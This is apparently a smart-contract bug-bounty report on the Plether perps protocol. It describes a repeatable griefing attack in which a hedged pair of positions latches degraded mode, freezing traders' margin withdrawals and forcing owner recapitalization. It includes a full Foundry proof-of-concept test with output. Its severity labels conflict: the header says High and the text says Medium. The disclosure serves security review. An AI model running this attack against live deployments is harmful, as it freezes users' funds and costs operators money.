# \#98279 [SC-High] Owner forced to repeatedly recapitalize, traders' free margin frozen: by a hedged pair latching degraded mode

**Submitted on Nov 6th 2026 at 16:54:58 UTC by @oxfuje for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #98279
- **Report Type:** Smart Contract
- **Report severity:** High
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)
  - Temporary freezing of funds for at least 1 hour

## Description


## Brief
This is a repeatable griefing attack. An unprivileged trader controls two accounts: A long and B short. They fill the pool's capacity with the pair, wait for a basket move of more than ~0.75% in A's favour, and close A. The pool pays A's profit in cash, but B's matching loss stays unrealized, so pool cash drops below the worst-case liability `L` and `degradedMode` latches.

While the attacker holds B, no trader with an open position can withdraw free margin. The latch never clears by itself, and the owner can only clear it after paying the shortfall from their own wallet. After each recapitalization the attacker can rebuild the pair and do it again on the next favourable move. The PoC runs three rounds, and the owner pays ~10k each time.

## Impact

- **Repeatable forced cost on the owner:** each round forces the owner to pay the shortfall from their own wallet before degraded mode can be cleared. After each payment the attack works again on the next favourable move. Three rounds in the PoC, with the owner paying 9,950 / 9,552 / 9,398 USDG.
- **No self-heal:** the latch is still in place after 25 hours and more if owner does not act. Only the attacker closing B, or the owner paying the shortfall (POC: 10,421 USDG), ends it.
- **Free margin frozen:** while latched, every trader with an open position can't withdraw free margin (victim's 10,000 USDG in the PoC). Their only way out is to close the position and pay fees and VPI.
- **Low risk for the attacker:** the attack costs ~7.6–8.4k in fees per round, plus carry on B (estimated ~130 USDG/day at the 5% `baseCarryBps` on ~1M notional), charged only when B exits. B's price risk can be hedged off-platform with FX: the basket uses the ICE Dollar Index weights (`script/DeployPerpsArbitrumSepolia.s.sol:154-159`), so DXY futures or per-currency FX positions offset it.
- **Cost reduction:** Being a junior LP as well recovers part of the VPI and carry they pay. The owner's recapitalization never reaches junior principal (`HousePoolPendingPreviewLib.sol:104-140`), so the attack is cheaper but not profitable.

## Vulnerability Details
**1. Opens leave a thin buffer.** An open needs pool cash `E >= L * (1 + settlementBufferBps)`, where `L = max(longMaxProfit, shortMaxProfit)` (`CfdEnginePlanLib.sol:421-424`, `:755-776`). The buffer is 25 bps (`CfdEngine.sol:153`). A hedged pair only counts once in `L`.

**2. Closes may break solvency.** "A valid close may project degraded mode; solvency is reported rather than rejected" (`CfdEnginePlanLib.sol:795`). Closing the long leg pays its profit in cash, but `L` doesn't drop if the short side is larger (`SolvencyAccountingLib.sol:113-125`). The 25 bps buffer is all that absorbs the payout.

**3. The engine latches degraded mode when cash falls below `L`** after any close or liquidation (`CfdEngine.sol:1320`, `:1344`, `:1364-1366`):
```solidity
if (effectiveAssetsAfter < maxLiabilityAssets) {
    degradedMode = true;
```

**4. While degraded, trader withdrawals revert** for any account with an open position (`CfdEngineSettlementSidecar.sol:274-276`).

**5. Only the owner can clear it,** and only once `E >= L` (`CfdEngine.sol:658-667`). While B is open, nothing else can raise `E`:
- unsolicited transfers aren't counted (`HousePool.sol:422-429`),
- B's carry isn't realized until B is touched,
- only the attacker can close a healthy B.

The owner has to call `recapitalizePool` (`CfdEngine.sol:632-655`) first.

**Threshold:** closing one leg costs ~0.5% of notional in VPI, so by this estimate the move must exceed ~0.5% VPI + 0.25% buffer ≈ 0.75%. The PoC uses a 2% move.

### Why this is not intended behaviour
The docs treat `E < L` as raw insolvency and latch degraded mode there (`packages/perps/SECURITY.md:940-943`). Degraded mode is meant to contain insolvency that a terminal transition *reveals* (`packages/perps/SECURITY.md:27`), and the runbook is written for real unpaid claims (`packages/perps/SECURITY.md:1500-1511`). The insolvency here is synthetic. The attacker is on both sides of the book, so A's realized profit is matched by B's unrealized loss, and LPs actually gain the attacker's fees. `E < L` holds only because the attacker keeps B's worst-case liability open for as long as they like. The docs don't cover a trader creating the latch at will, holding it open, and repeating it.

Besides the owner's cost, we count only the trader free-margin freeze, because LP withdrawals are already limited by normal utilization while B is open. Traders can escape only by closing and paying fees and VPI. The owner's only fix is paying ~10k per round, which is why this is Medium and not High.

## Proof of Concept


## Attack Scenario
1. The pool sits near `L`, which is normal since opens are admitted down to the 25 bps buffer.
2. The attacker opens B short and A long until capacity is full. B's side is larger, so B sets `L`.
3. The basket moves more than ~0.75% in A's favour. The attacker closes A, and `degradedMode` latches. They hedge B with FX in the same block.
4. While B is held, every position holder's free-margin withdrawal reverts, and `clearDegradedMode` reverts `StillInsolvent`.
5. The owner pays the shortfall and clears. The attacker closes B, rebuilds the pair, and repeats on the next favourable move.

## Coded Proof of Concept
Unprivileged attacker with two accounts. Testnet risk params (`script/DeployPerpsArbitrumSepolia.s.sol:434-445`), 25 bps buffer, ~1M junior pool. Orders go through `BasePerpTest`'s `_open`/`_close`, which call `engine.processOrderTyped` like the router does. The owner appears only to show that recapitalization is the one way out.

- **`test_HoldingLosingLegKeepsProtocolInsolventAndFrozen`:**
  - The victim can withdraw before the attack.
  - After A closes in profit (2% move), the pool is 10,421 USDG below `L` and the victim is frozen.
  - `clearDegradedMode` reverts immediately, after 25 hours, and after 120 days.
  - Only an owner recapitalization ends it.
- **`test_AttackRepeatsEveryFavourableMove`:** three rounds of fill → 2% move → close A → owner pays → clear → close B. Each round latches again and freezes the victim again.

The PoC also asserts that the LP withdrawal gate closes. We don't count that toward the impact (see above).

```bash
cd packages/perps
forge test --match-path test/poc/winning-close-latches-degraded-mode.t.sol -vv
```

`packages/perps/test/poc/winning-close-latches-degraded-mode.t.sol`:
```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../perps/BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {ICfdEngineTypes} from "@plether/perps/interfaces/ICfdEngineTypes.sol";
import {console2} from "forge-std/console2.sol";

/// Attacker: an ordinary trader with two accounts (A long, B short). Testnet risk params
/// (script/DeployPerpsArbitrumSepolia.s.sol:_riskParams), default settlementBufferBps = 25, a 1M junior pool.
/// No privileged role.
contract WinningCloseLatchesDegradedModePoC is BasePerpTest {

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    address victim = address(0x71C7);
    address attackerA = address(0xA11CE);
    address attackerB = address(0xB0B);

    function _attackerBalance() internal view returns (uint256) {
        return clearinghouse.balanceAssets(attackerA) + clearinghouse.balanceAssets(attackerB);
    }

    /// Main attack: the attacker keeps the losing leg B open. The pool stays below maxLiability, so the owner
    /// cannot clear the latch; every position holder's free margin stays frozen (25h and 120 days shown) until
    /// the owner recapitalizes from its own wallet.
    function test_HoldingLosingLegKeepsProtocolInsolventAndFrozen() public {
        _fundTrader(victim, 20_000e6);
        _fundTrader(attackerA, 30_000e6);
        _fundTrader(attackerB, 60_000e6);

        _open(victim, CfdTypes.Side.LONG, 100_000e18, 10_000e6, 1e8);
        for (uint256 i; i < 9; ++i) {
            _open(attackerB, CfdTypes.Side.SHORT, 111_000e18, 5000e6, 1e8);
            _open(attackerA, CfdTypes.Side.LONG, 98_000e18, 2500e6, 1e8);
        }
        assertTrue(pool.isWithdrawalLive(), "LP withdrawals live before attack");
        uint256 snap = vm.snapshotState();
        vm.prank(victim);
        clearinghouse.withdraw(victim, 1000e6);
        vm.revertToState(snap);

        _close(attackerA, CfdTypes.Side.LONG, 882_000e18, 0.98e8);
        assertTrue(engine.degradedMode());
        uint256 shortfall = _maxLiability() - pool.totalAssets();
        console2.log("shortfall E < L   ", shortfall);
        assertFalse(pool.isWithdrawalLive(), "LP withdrawals frozen");
        assertEq(pool.getMaxJuniorWithdraw(), 0);

        vm.expectRevert(ICfdEngineTypes.CfdEngine__StillInsolvent.selector);
        engine.clearDegradedMode();

        vm.warp(block.timestamp + 25 hours);
        assertTrue(engine.degradedMode(), "still latched after 24h");
        assertFalse(pool.isWithdrawalLive(), "LP withdrawals still frozen after 24h");
        assertEq(pool.getMaxJuniorWithdraw(), 0);
        vm.expectRevert(ICfdEngineTypes.CfdEngine__StillInsolvent.selector);
        engine.clearDegradedMode();
        vm.prank(victim);
        vm.expectRevert(ICfdEngineTypes.CfdEngine__DegradedMode.selector);
        clearinghouse.withdraw(victim, 1000e6);

        // No self-heal: unrealized carry never reaches pool cash while B stays untouched.
        vm.warp(block.timestamp + 120 days);
        engine.checkpointCarryIndexes();
        vm.expectRevert(ICfdEngineTypes.CfdEngine__StillInsolvent.selector);
        engine.clearDegradedMode();
        vm.prank(victim);
        vm.expectRevert(ICfdEngineTypes.CfdEngine__DegradedMode.selector);
        clearinghouse.withdraw(victim, 1000e6);

        // Owner's only exit: pay the attacker-made hole from its own wallet.
        uint256 hole = _maxLiability() - pool.totalAssets();
        console2.log("owner must inject ", hole);
        settlementToken.mint(address(this), hole);
        settlementToken.approve(address(engine), hole);
        engine.recapitalizePool(hole);
        engine.clearDegradedMode();
        assertFalse(engine.degradedMode());
    }

    /// Repeatable: after each owner recap + clear, the attacker unwinds, rebuilds the pair and latches again on the
    /// next favourable move. Every round freezes the victim again and costs the owner another payment.
    function test_AttackRepeatsEveryFavourableMove() public {
        _fundTrader(victim, 20_000e6);
        _fundTrader(attackerA, 60_000e6);
        _fundTrader(attackerB, 120_000e6);
        _open(victim, CfdTypes.Side.LONG, 100_000e18, 10_000e6, 1e8);
        uint256 px = 1e8;
        for (uint256 round = 1; round <= 3; ++round) {
            uint256 next = px * 98 / 100;
            uint256 balBefore = _attackerBalance();
            (uint256 aSize, uint256 bSize) = _fillCapacity(px);
            _close(attackerA, CfdTypes.Side.LONG, aSize, next);
            assertTrue(engine.degradedMode(), "latched again");
            vm.prank(victim);
            vm.expectRevert(ICfdEngineTypes.CfdEngine__DegradedMode.selector);
            clearinghouse.withdraw(victim, 1000e6);

            uint256 hole = _maxLiability() - pool.totalAssets();
            settlementToken.mint(address(this), hole);
            settlementToken.approve(address(engine), hole);
            engine.recapitalizePool(hole);
            engine.clearDegradedMode();
            _close(attackerB, CfdTypes.Side.SHORT, bSize, next);
            if (engine.degradedMode()) engine.clearDegradedMode();

            console2.log("round", round);
            console2.log("  owner paid   ", hole);
            console2.log("  attacker cost", balBefore - _attackerBalance());
            px = next;
        }
    }

    /// Opens B short / A long in chunks until admission rejects, leaving B's side as the larger max profit.
    function _fillCapacity(uint256 px) internal returns (uint256 aSize, uint256 bSize) {
        for (uint256 i; i < 200; ++i) {
            if (!_tryOpen(attackerB, CfdTypes.Side.SHORT, 25_000e18, 1300e6, px)) break;
            bSize += 25_000e18;
            if (!_tryOpen(attackerA, CfdTypes.Side.LONG, 22_000e18, 600e6, px)) break;
            aSize += 22_000e18;
        }
        for (uint256 i; i < 60; ++i) {
            if (!_tryOpen(attackerB, CfdTypes.Side.SHORT, 1000e18, 100e6, px)) break;
            bSize += 1000e18;
        }
    }

    function _tryOpen(address a, CfdTypes.Side side, uint256 size, uint256 margin, uint256 px) internal returns (bool) {
        try this.extOpen(a, side, size, margin, px) {
            return true;
        } catch {
            return false;
        }
    }

    function extOpen(address a, CfdTypes.Side side, uint256 size, uint256 margin, uint256 px) external {
        _open(a, side, size, margin, px);
    }

}
```

Output:
```
[PASS] test_AttackRepeatsEveryFavourableMove()
Logs:
  round 1
    owner paid    9950123894
    attacker cost 8404210098
  round 2
    owner paid    9551598206
    attacker cost 8004329746
  round 3
    owner paid    9397796833
    attacker cost 7627772786

[PASS] test_HoldingLosingLegKeepsProtocolInsolventAndFrozen()
Logs:
  shortfall E < L    10420956343
  owner must inject  10420956343

Suite result: ok. 2 passed; 0 failed; 0 skipped
```

